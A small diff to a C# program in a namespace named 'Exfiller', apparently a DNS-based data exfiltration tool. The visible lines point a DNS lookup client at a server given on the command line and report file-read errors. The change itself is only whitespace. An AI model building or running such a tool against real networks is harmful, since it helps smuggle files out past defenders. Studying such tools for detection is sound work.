@@ -14,7 +14,7 @@ namespace Exfiller
 		static void Main(string[] args)
 		{
 			// Setup DNSClient variables using command line argument as the target DNS server
-      // The DNSClient NuGet package needs to be added
+      		// The DNSClient NuGet package needs to be added
 			String targetDNSServer = args[1];
 			var endpoint = new IPEndPoint(IPAddress.Parse(targetDNSServer), 53);
 			var client = new LookupClient(endpoint);
@@ -74,11 +74,6 @@ namespace Exfiller
 			{
 				Console.WriteLine("Error reading file!");
 			}
-
-
-
-
-			
 
 		}
 	}
